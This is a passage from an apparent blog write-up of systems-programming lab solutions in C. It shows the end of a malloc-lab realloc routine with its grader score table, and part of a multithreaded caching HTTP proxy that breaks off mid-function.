<span class="keyword">if</span> (!GET_SIZE(HDRP(NEXT_BLKP(new_bp)))) {</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">long</span>)mem_sbrk(asize - fsize) == <span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            PUT(HDRP(new_bp), PACK(asize, GET_PREV_MINI(HDRP(new_bp)), GET_PREV_ALLO(HDRP(new_bp)), <span class="number">1</span>));</span><br><span class="line">            <span class="built_in">memcpy</span>(new_bp, bp, psize);</span><br><span class="line">            PUT(HDRP(NEXT_BLKP(new_bp)), PACK(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">return</span> new_bp;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="type">void</span>* m_bp = mm_malloc(size);</span><br><span class="line">            <span class="keyword">if</span> (m_bp == <span class="literal">NULL</span>) </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">memcpy</span>(m_bp, bp, psize);</span><br><span class="line">            mm_free(new_bp);</span><br><span class="line">            <span class="keyword">return</span> m_bp;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fsize &gt;= asize + DWORD) {  </span><br><span class="line">        <span class="keyword">return</span> place_threshold_realloc(bp, new_bp, fsize, asize, psize, <span class="number">64</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        PUT(HDRP(new_bp), PACK(fsize, GET_PREV_MINI(HDRP(new_bp)), GET_PREV_ALLO(HDRP(new_bp)), <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(new_bp, bp, psize);</span><br><span class="line">        set_nextblock_alloc_prev(new_bp, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        set_nextblock_mini_prev(new_bp, fsize &gt; DWORD ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> new_bp;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>What about this time for our cute score?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.000162 35235</span><br><span class="line"> 1       yes  100%    5848  0.000192 30427</span><br><span class="line"> 2       yes   99%    6648  0.000184 36091</span><br><span class="line"> 3       yes  100%    5380  0.000141 38048</span><br><span class="line"> 4       yes   94%   14400  0.000262 54983</span><br><span class="line"> 5       yes   94%    4800  0.000325 14769</span><br><span class="line"> 6       yes   94%    4800  0.000311 15449</span><br><span class="line"> 7       yes   87%   12000  0.004518  2656</span><br><span class="line"> 8       yes   74%   24000  0.011462  2094</span><br><span class="line"> 9       yes  100%   14401  0.018781   767</span><br><span class="line">10       yes   99%   14401  0.001136 12683</span><br><span class="line">11       yes   78%   57716  0.159908   361</span><br><span class="line">12       yes   78%  100000  0.316146   316</span><br><span class="line">13       yes   99%   20000  0.000295 67912</span><br><span class="line">14       yes   70%  200400  0.009781 20490</span><br><span class="line">15       yes   58%    6495  0.002252  2884</span><br><span class="line">Total          89%  496983  0.525856   945</span><br><span class="line"></span><br><span class="line">Perf index = 53 (util) + 40 (thru) = 93/100</span><br></pre></td></tr></table></figure>
<p>A score of 93 out of 100! That's good enough for our (at least my
own) target. As you can see, there are still space to improve utility
but this requires much more deeper analysis into the trace files and
smarter strategies to eliminate fragmentation.</p>
<h1 id="lab-8-proxy-lab">Lab 8: Proxy Lab</h1>
<p>In this lab, you're required to implement a simple proxy server that
receives requests from clients and transmit them to the destination
server. When the server sends back the response, your proxy transmits it
back to the client.</p>
<p>I used pre-threading as it's simple to implement and achieves good
efficiency. The entire lab can be done in the following steps:</p>
<ol type="1">
<li>Create threads, initialize them and wait for available items (client
connections).</li>
<li>Use an infinite loop to listen for client connections and insert
file descriptors to the queue.</li>
<li>For each connection, parse the uri, and check if it's already in the
cache.</li>
<li>If it's not in the cache, extract the host, port and file path,
build headers and open a new connection to the server. Keep reading the
response from the server and writing to the client. Don't forget to
cache the content.</li>
<li>If it's already in the cache, just read the content from the cache
and write it back to the client.</li>
</ol>
<p>I leveraged the first class read-write solution in the textbook. In
this solution, readers have a higher priority than writers. Writing is
allowed only when all readers finish their work.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_BLK 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NTHREADS 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBUFSIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n"</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *connection_hdr = <span class="string">"Connection: close\r\n"</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *proxy_hdr = <span class="string">"Proxy-Connection: close\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">	<span class="type">char</span> uri[MAXLINE];</span><br><span class="line">	<span class="type">char</span> buf[MAX_OBJECT_SIZE];</span><br><span class="line">	<span class="type">int</span> buf_size;</span><br><span class="line">	<span class="type">int</span> read_cnt;</span><br><span class="line">	<span class="type">int</span> stamp;</span><br><span class="line">    <span class="type">sem_t</span> mutex;</span><br><span class="line">	<span class="type">sem_t</span> write;</span><br><span class="line">} <span class="type">cache_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">cache_t</span> caches[MAX_CACHE_BLK];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">	<span class="type">int</span> *buf;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">int</span> front;</span><br><span class="line">	<span class="type">int</span> rear;</span><br><span class="line">	<span class="type">sem_t</span> mutex;</span><br><span class="line">	<span class="type">sem_t</span> slots;</span><br><span class="line">	<span class="type">sem_t</span> items;</span><br><span class="line">} <span class="type">sbuf_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">sbuf_t</span> sbuf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span> <span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *uri, <span class="type">char</span> *host, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">build_headers</span> <span class="params">(<span class="type">rio_t</span> *rp, <span class="type">char</span> *buf, <span class="type">char</span> *method, <span class="type">char</span> *filename, <span class="type">char</span> *version, <span class="type">char</span> *host)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clienterror</span> <span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *cause, <span class="type">char</span> *errnum, <span class="type">char</span> *shortmsg, <span class="type">char</span> *longmsg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_init</span> <span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_deinit</span> <span class="params">(<span class="type">sbuf_t</span> *sp)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_insert</span> <span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">sbuf_remove</span> <span class="params">(<span class="type">sbuf_t</span> *sp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_init</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt)</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">cache_read</span> <span class="params">(<span class="type">cache_t</span> *cache, <span class="type">char</span> *buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_write</span> <span class="params">(<span class="type">cache_t</span> *cache, <span class="type">char</span> *uri, <span class="type">char</span> *buf, <span class="type">int</span> size)</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">cache_search</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt, <span class="type">char</span> *uri)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_update</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt, <span class="type">cache_t</span> *cache)</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">cache_evict</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt)</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">cache_latest</span> <span class="params">(<span class="type">cache_t</span> *caches, <span class="type">int</span> cache_cnt)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread</span><span class="params">(<span class="type">void</span> *vargp)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> i, listenfd, connfd;</span><br><span class="line">	<span class="type">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">	<span class="type">socklen_t</span> clientlen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">	<span class="type">pthread_t</span> tid[NTHREADS];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>) {</span><br><span class="line">		<span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">exit</span> (<span class="number">0</span>);</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	listenfd = Open_listenfd (argv[<span class="number">1</span>]);</span><br><span class="line">	sbuf_init (&amp;sbuf, SBUFSIZE);</span><br><span class="line">	cache_init (caches, MAX_CACHE_BLK);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">		Pthread_create (&amp;tid[i], <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">		clientlen = <span class="keyword">sizeof</span> (clientaddr);</span><br><span class="line">		connfd = Accept (listenfd, (SA *) &amp;clientaddr, &amp;clientlen);</span><br><span class="line">		Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">printf</span> (<span class="string">"Accepted connection from (%s, %s)\n"</span>, hostname, port);</span><br><span class="line">		sbuf_insert (&amp;sbuf, connfd);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	sbuf_deinit (&amp;sbuf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_init</span> <span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span></span><br><span class="line">{</span><br><span class="line">	sp-&gt;buf = Calloc (n, <span class="keyword">sizeof</span> (<span class="type">int</span>));</span><br><span class="line">	sp-&gt;n = n;</span><br><span class="line">	sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;</span><br><span class="line">	Sem_init (&amp;sp-&gt;mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	Sem_init (&amp;sp-&gt;slots, <span class="number">0</span>, n);</span><br><span class="line">	Sem_init (&amp;sp-&gt;items, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_deinit</span> <span class="params">(<span class="type">sbuf_t</span> *sp)</span></span><br><span class="line">{</span><br><span class="line">	Free (sp-&gt;buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbuf_insert</span> <span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span></span><br><span class="line">{</span><br><span class="line">	P (&amp;sp-&gt;slots);</span><br><span class="line">	P (&amp;sp-&gt;mutex);</span><br><span class="line">	sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;n)] = item;</span><br><span class="line">	V (&amp;sp-&gt;mutex);</span><br><span class="line">	V (&amp;sp-&gt;items);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sbuf_remove</span> <span class="params">(<span class="type">sbuf_t</span> *sp)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> item;</span><br><span class="line">	P (&amp;sp-&gt;items);</span><br><span class="line">	P (&amp;sp-&gt;mutex);</span><br><span class="line">	item = sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;n)];</span><br><span class="line">	V (&amp;sp-&gt;mutex);</span><br><span class="line">	V (&amp;sp-&gt;slots);</span><br><span class="line">	<span class="keyword">return</span> item;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread</span> <span class="params">(<span class="type">void</span>* vargp)</span></span><br><span class="line">{</span><br><span class="line">	Pthread_detach (pthread_self());</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">		<span class="type">int</span> connfd = sbuf_remove (&amp;sbuf);</span><br><span class="line">		doit (connfd);</span><br><span class="line">		Close (connfd);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span> <span class="params">(<span class="type">int</span> fd)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> host[MAXLINE], port[MAXLINE], filename[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio, t_rio;</span><br><span class="line">	<span class="type">int</span> n_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read request line and headers */</span></span><br><span class="line">    Rio_readinitb (&amp;rio, fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb (&amp;rio, buf, MAXLINE)) </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">"%s"</span>, buf);</span><br><span class="line">    <span class="built_in">sscanf</span> (buf, <span class="string">"%s %s %s"</span>, method, uri, version); </span><br><span class="line">    <span class="keyword">if</span> (strcasecmp (method, <span class="string">"GET"</span>)) { </span><br><span class="line">        clienterror (fd, method, <span class="string">"501"</span>, <span class="string">"Not Implemented"</span>,</span><br><span class="line">                    <span class="string">"Tiny does not implement this method"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span> (version, <span class="string">"HTTP/1.1"</span>)) {</span><br><span class="line">		<span class="built_in">strcpy</span> (version, <span class="string">"HTTP/1.0"</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> cache_idx = cache_search (caches, MAX_CACHE_BLK, uri);</span><br><span class="line">	<span class="keyword">if</span> (cache_idx == <span class="number">-1</span>) {  <span class="comment">// Cache not found</span></span><br><span class="line">		parse_uri (uri, host, port, filename);</span><br><span class="line">		build_headers (&amp;rio, buf, method, filename, version, host);</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span> t_buf[MAX_OBJECT_SIZE]; </span><br><span class="line">		*t_buf = <span class="string">'\0'</span>;</span><br><span class="line">		<span class="type">int</span> t_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> clientfd = Open_clientfd (host, port);</span><br><span class="line">		Rio_readinitb (&amp;t_rio, clientfd);</span><br><span class="line">		Rio_writen (clientfd, buf, <span class="built_in">strlen</span> (buf));</span><br><span class="line">		<span class="keyword">while</span> ((n_read = Rio_readlineb (&amp;t_rio, buf, MAXLINE)) &gt; <span class="number">0</span>) {</span><br><span class="line">			Rio_writen (fd, buf, n_read);</span><br><span class="line">			<span class="built_in">strcat</span> (t_buf, buf);</span><br><span class="line">			t_size += n_read;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">if</span> (t_size &lt; MAX_OBJECT_SIZE) {</span><br><span class="line">			<span class="type">int</span> idx = cache_evict (caches, MAX_CACHE_BLK);</span><br><span class="line">			cache_write (&amp;caches[idx], uri, t_buf, t_size);</span><br><span class="line">		}</span><br><span class="line">		Close (clientfd);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span> {  <span class="comment">// Cache found</span></span><br><span class="line">		<span class="type">int</span> n_read = cache_read (&amp;caches[cache_idx], buf);</span><br><span class="line">		Rio_writen (fd, buf, n_read);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *uri, <span class="type">char</span> *host, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line">	</span><br><span class="line">	*host = <span class="string">'\0'</span>;</span><br><span class="line">	*port = <span class="string">'\0'</span>;</span><br><span class="line">	*filename = <span class="string">'\0'</span>;</span><br><span class="line">	</span><br><span class="line">	ptr = <span class="built_in">strstr</span> (uri, <span class="string">"//"</span>);</span><br><span class="line">	ptr += <span class="number">2</span>;</span><br><span class="line">	<span class="type">char</span> *p_filename = <span class="built_in">strstr</span> (ptr, <span class="string">"/"</span>);</span><br><span class="line">	<span class="type">char</span> *p_port = <span class="built_in">strstr</span> (ptr, <span class="string">":"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (p_port) {</span><br><span class="line">		<span class="keyword">if</span> (p_filename) {</span><br><span class="line">			<span class="type">size_t</span> len = p_filename - p_port - <span class="number">1</span>;</span><br><span class="line">			<span class="built_in">strncpy</span> (port, p_port + <span class="number">1</span>, len);</span><br><span class="line">			*(port + len) = <span class="string">'\0'</span>;</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="built_in">strcpy</span> (port, p_port + <span class="number">1</span>);</span><br><span class="line">		}</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		<span class="built_in">strcpy</span> (port, <span class="string">"80"</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p_filename) {</span><br><span class="line">		<span class="built_in">strcpy</span> (filename, p_filename);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p_port) {</span><br><span class="line">		<span class="type">size_t</span> len = p_port - ptr;</span><br><span class="line">		<span class="built_in">strncpy</span> (host, ptr, len);</span><br><span class="line">		*(host + len) = <span class="string">'\0'</span>;</span><br><span class="line">	} <span class="keyword">else</span> <span class="keyword">if</span> (p_filename) {</span><br><span class="line">		<span class="type">size_t</span> len = p_filename - ptr;</span><br><span class="line">		<span class="built_in">strncpy</span> (host, ptr, len);</span><br><span class="line">		*(host + len) = <span class="string">'\0'</span>;</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		<span class="built_in">strcpy</span> (host, ptr);</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_headers</span> <span class="params">(<span class="type">rio_t</span> *rp, <span class="type">char</span> *buf, <span class="type">char</span> *method, <span class="type">char</span> *filename, <span class="type">char</span> *version, <span class="type">char</span> *hostname)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">char</span> req[MAXLINE], host[MAXLINE], remaining[MAXLINE];</span><br><span class="line">	<span class="type">char</span> t_buf[MAXLINE];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span> (req, <span class="string">"GET %s HTTP/1.0\r\n"</span>, filename);</span><br><span class="line">	<span class="built_in">sprintf</span> (host, <span class="string">"HOST: %s\r\n"</span>, hostname);</span><br><span class="line"></span><br><span class="line">	Rio_readlineb (rp, t_buf, MAXLINE);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">strcmp</span> (t_buf, <span class="string">"\r\n"</span>)) {</span><br><span class="line">		<span class="keyword">if</span> (!strncasecmp (t_buf, <span class="string">"HOST"</span>, <span class="number">4</span>)) 